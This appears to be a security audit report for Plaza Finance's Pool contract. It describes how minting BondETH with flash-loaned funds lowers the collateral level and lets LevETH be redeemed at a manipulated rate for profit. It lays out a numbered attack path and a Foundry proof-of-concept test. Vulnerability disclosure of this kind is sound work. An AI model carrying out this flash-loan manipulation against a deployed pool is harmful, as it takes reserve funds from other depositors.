### Summary

The pool manipulation is possible which could lead to reserve loss. In an certain situation pool is behaving different as it should not be behaving.

Lev Rate is important here, if trader mint the LevETH at high Lev Rate and redeemed it lower. So that trader made profit here. Basically he redeemed the more ETH which initially deposited. That extra ETH which he redeemed is his amplified gains (benefit of leverage).

The collateral level represents the amount of extra ETH available against outstanding bonds (debt). Two factors influence the collateral level:
- Change in supply of any Token (Bond or LevETH).
- Change in Price of underlying Assets.



Below I have explained the how these two factor affecting the **Collateral Level**, and then how collateral level affecting the `Lev Rate`. It also show where the protocol is behaving differently, which made the manipulation possible for the monetary gains.
![Image](https://github.com/user-attachments/assets/9ddfd676-4d27-4c42-9e45-0d2eee92b36c)

As explained above the change in collateral level due to supply fluction can causing a different affect on Lev Rate.


**The manipulation is possible in this way.**
1. Use 1 ETH to mint `LevETH` in which we gain profit.
2. Now we mint `BondETH` in order to decrease the `Collateral Level` to making the protocol to use the another formula (2).
- It also decrease the Lev Rate As the collateral level is fluctutaed due to supply manipulation.
4. As Lev Rate is decreased here, we can withdraw the initially minted LevETH at low `Lev Rate` (In profit basically).
5. Now we redeem that minted Bond as well.
6. Slippage loss wouldn't be problem here.
- The issue could be with market rate safety feature. If that is lower than redeem rate.
- Beacause we can do this as soon as the pool unpaused, In starting the market rate would be 100.
- As long as (Market Rate >= Redeem Rate)

### Root Cause

The attack is possible due to the mechanism of `Pool::getRedeemAmount`.
The creation or redemption mechanism for each token has two formulas. Which formula to use depends on the collateral Level.
To redeem the `LevETH` formulas are.
![Image](https://github.com/user-attachments/assets/ca69af5e-4458-4247-b921-eec09137d0bf)

By minting the `Bond ETH` in step 2 it decrease the collateral level, forces protocol to use the another formula for redeem instead of 1st one.
To understand better way what happen here is

![Image](https://github.com/user-attachments/assets/def1468b-e01b-4fbd-afa4-0fac8242515f)

`Pool::getRedeemAmount`
While Redeeming the Bond ETH we wouldn't face any loss as well. Because at the time of redemtion we considering delta (BondETH to burn) to decrease it from acutal supply.

https://github.com/sherlock-audit/2024-12-plaza-finance-farmanlearningweb3/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Pool.sol#L498C6-L498C136
```solidity
collateralLevel = ((tvl - (depositAmount * BOND_TARGET_PRICE)) * PRECISION) / ((bondSupply - depositAmount) * BOND_TARGET_PRICE);
```
This will increase the collateral level, and the formula wouldn't affect the loss.

### Internal Pre-conditions

_No response_

### External Pre-conditions

- Market Rate >= Redeem Rate

### Attack Path

1. Take flash loan of underlying asset.
2. Use 1 ETH to mint `LevETH` at high `levRate`
3. Use 50 ETH to mint `BondETH` to decrease the collateral level.
4. Redeem the initial minted `LevETH` at low `levRate`
5. Now redeem the `BondETH`
6. Keep the profit, repay the flash loan.

### Impact

The malicious Actor can able to make the profit of 0.43 ETH. But it can be done multiple times. With precise calculation the profit can be increase.

### PoC

Initial pool value is taken which is considered healthy from `script/Testnet.s.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import {Pool} from "../src/Pool.sol";
import {Token} from "./mocks/Token.sol";
import {Auction} from "../src/Auction.sol";
import {Utils} from "../src/lib/Utils.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {BondToken} from "../src/BondToken.sol";
import {TestCases} from "./data/TestCases.sol";
import {Decimals} from "../src/lib/Decimals.sol";
import {PoolFactory} from "../src/PoolFactory.sol";
import {Distributor} from "../src/Distributor.sol";
import {OracleFeeds} from "../src/OracleFeeds.sol";
import {Validator} from "../src/utils/Validator.sol";
import {OracleReader} from "../src/OracleReader.sol";
import {LeverageToken} from "../src/LeverageToken.sol";
import {MockPriceFeed} from "./mocks/MockPriceFeed.sol";
import {Deployer} from "../src/utils/Deployer.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {UpgradeableBeacon} from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {console} from "forge-std/console.sol";

contract PersTest is Test, TestCases {
using Decimals for uint256;
using Strings for uint256;

PoolFactory private poolFactory;
PoolFactory.PoolParams private params;

MockPriceFeed private mockPriceFeed;
address private oracleFeedsContract;

address private deployer = address(0x1);
address private minter = address(0x2);
address private governance = address(0x3);
address private securityCouncil = address(0x4);
address private user = address(0x5);
address private user2 = address(0x6);
address private user3 = address(0x7);
address private user4 = address(0x8);
address private user5 = address(0x9);
BondToken bond;
Pool pool;
LeverageToken lev;
Token rToken;


address public constant ethPriceFeed = address(0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70);
uint256 private constant CHAINLINK_DECIMAL_PRECISION = 10**8;
uint8 private constant CHAINLINK_DECIMAL = 8;

/**
* @dev Sets up the testing environment.
* Deploys the BondToken contract and a proxy, then initializes them.
* Grants the minter and governance roles and mints initial tokens.
*/
function setUp() public {
vm.startPrank(deployer);

address contractDeployer = address(new Deployer());
oracleFeedsContract = address(new OracleFeeds());

address poolBeacon = address(new UpgradeableBeacon(address(new Pool()), governance));
address bondBeacon = address(new UpgradeableBeacon(address(new BondToken()), governance));
address levBeacon = address(new UpgradeableBeacon(address(new LeverageToken()), governance));
address distributorBeacon = address(new UpgradeableBeacon(address(new Distributor()), governance));

poolFactory = PoolFactory(Utils.deploy(address(new PoolFactory()), abi.encodeCall(
PoolFactory.initialize,
(governance, contractDeployer, oracleFeedsContract, poolBeacon, bondBeacon, levBeacon, distributorBeacon)
)));

params.fee = 0;
params.feeBeneficiary = governance;
params.reserveToken = address(new Token("Wrapped ETH", "WETH", false));
params.sharesPerToken = 2_500_000;
params.distributionPeriod = 7776000;
params.couponToken = address(new Token("USDC", "USDC", false));
OracleFeeds(oracleFeedsContract).setPriceFeed(params.reserveToken, address(0), ethPriceFeed, 1 days);

// Deploy the mock price feed
mockPriceFeed = new MockPriceFeed();

// Use vm.etch to deploy the mock contract at the specific address
bytes memory bytecode = address(mockPriceFeed).code;
vm.etch(ethPriceFeed, bytecode);

// Set oracle price
mockPriceFeed = MockPriceFeed(ethPriceFeed);
mockPriceFeed.setMockPrice(3125 * int256(CHAINLINK_DECIMAL_PRECISION), uint8(CHAINLINK_DECIMAL));
vm.stopPrank();

vm.startPrank(governance);
poolFactory.grantRole(poolFactory.POOL_ROLE(), governance);
poolFactory.grantRole(poolFactory.SECURITY_COUNCIL_ROLE(), securityCouncil);
vm.stopPrank();
}

function testRedeemPersonal() public {
vm.startPrank(governance);
rToken = Token(params.reserveToken);

// Mint reserve tokens
rToken.mint(governance, 100 ether);
rToken.approve(address(poolFactory), 100 ether);

// Create pool and approve deposit amount
pool = Pool(poolFactory.createPool(params, 100 ether, 2500 ether, 100 ether, "", "", "", "", false));
bond = pool.bondToken();
lev = pool.lToken();
assertEq(2500 ether, BondToken(pool.bondToken()).totalSupply());
assertEq(100 ether, LeverageToken(pool.lToken()).totalSupply());


// Used 1 ETH to mint Lev ETH in which we will take profit
console.log("1st Iteration");
createToken(user4, 1 ether, Pool.TokenType.LEVERAGE);
console.log(" ");

//Used 50 ETH to mint Bond ETH to decrease the collateral level.
console.log("2st Iteration");
uint amountUsedtoMindBond = 50 ether;
createToken(user, amountUsedtoMindBond, Pool.TokenType.BOND);
console.log(" ");



// Now the collateral level has decreased let redeem the leverage
vm.startPrank(user4);
console.log("3rd Iteration");
uint amount = pool.redeem(Pool.TokenType.LEVERAGE, 5 ether, 1);
console.log("Amt Redeemed:", amount);
console.log(" ");
assertEq(amount, rToken.balanceOf(user4));
vm.stopPrank();
// redeem the remaining bond.
vm.startPrank(user);
console.log("4th Iteration");
uint amountRtBond = pool.redeem(Pool.TokenType.BOND, bond.balanceOf(user), 1);
console.log("Amt Red Bond:", amountRtBond);
assertEq(amountRtBond, rToken.balanceOf(user));
assert(amountUsedtoMindBond >= rToken.balanceOf(user));
vm.stopPrank();

}

function createToken(address inBehalfOf,uint dealAmount, Pool.TokenType tokenType ) internal {
vm.startPrank(inBehalfOf);
deal(address(rToken), inBehalfOf, dealAmount );
rToken.approve(address(pool), dealAmount);
uint amount = pool.create(tokenType, dealAmount, 1);
console.log("Collat. Used:", dealAmount);
console.log(" Amnt Minted:", amount);
if(tokenType == Pool.TokenType.BOND){
assertEq(amount, bond.balanceOf(inBehalfOf));
} else {
assertEq(amount, lev.balanceOf(inBehalfOf));
}
vm.stopPrank();
}
}
```

### Mitigation

For this the resolution would be (not to use 20% formula for redeem lev Rat). But then the changes also required in creating mechanism. As this is core formula, it would required more time to choose the right solution, considering all the edge cases.

This contract shows here, redeeming with different formula but with same values. Save As the used extra above ETH in redemption. poc, with different formula `calc` the pool didn't redeem extra the pool just redeemed only 1 ETH which initially minted.
```solidity



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Decimals} from "Decimals.sol";
import {console} from "hardhat/console.sol";

contract Encoding {

using Decimals for uint256;
uint PRECISION = 1000000;
uint depositAmount = 5e18;
// uint redeemRate = 434602649;
uint8 oracleDecimals = 8;
uint ethPrice = 312500000000;
uint BOND_TARGET_PRICE = 100;
uint bondSupply = 4062500000000000000000;

// inside Collateral Threshold
uint tvl = 471875000000000000000000; //471875
uint256 private constant multiplier = 200000;
uint256 assetSupply = 105e18;

// we can create illusion for protocol we have capital even when we don't have by forcing it to using 20% capital.

function calc() public view returns (uint256) {
uint redeemRate = ((tvl - (bondSupply * BOND_TARGET_PRICE)) / assetSupply) * PRECISION; // 65625 // 65625_000000000000000000/105e18
console.log("redRate",redeemRate);
console.log("dep*red", (depositAmount * redeemRate));
return ((depositAmount * redeemRate).fromBaseUnit(oracleDecimals) / ethPrice) / PRECISION;
}
// 1000000000000000000

function calcInsideCollaterTHrs() public view returns (uint256) {
uint redRate = ((tvl * multiplier) / assetSupply); // 94375 // 94375_000000000000000000/105e18
console.log("Inside Collateral Threshold");
console.log("redRate",redRate);
console.log("dep*red", (depositAmount * redRate));
return ((depositAmount * redRate).fromBaseUnit(oracleDecimals) / ethPrice) / PRECISION; // 898.809523
}
// 1438095236800000000


}



```
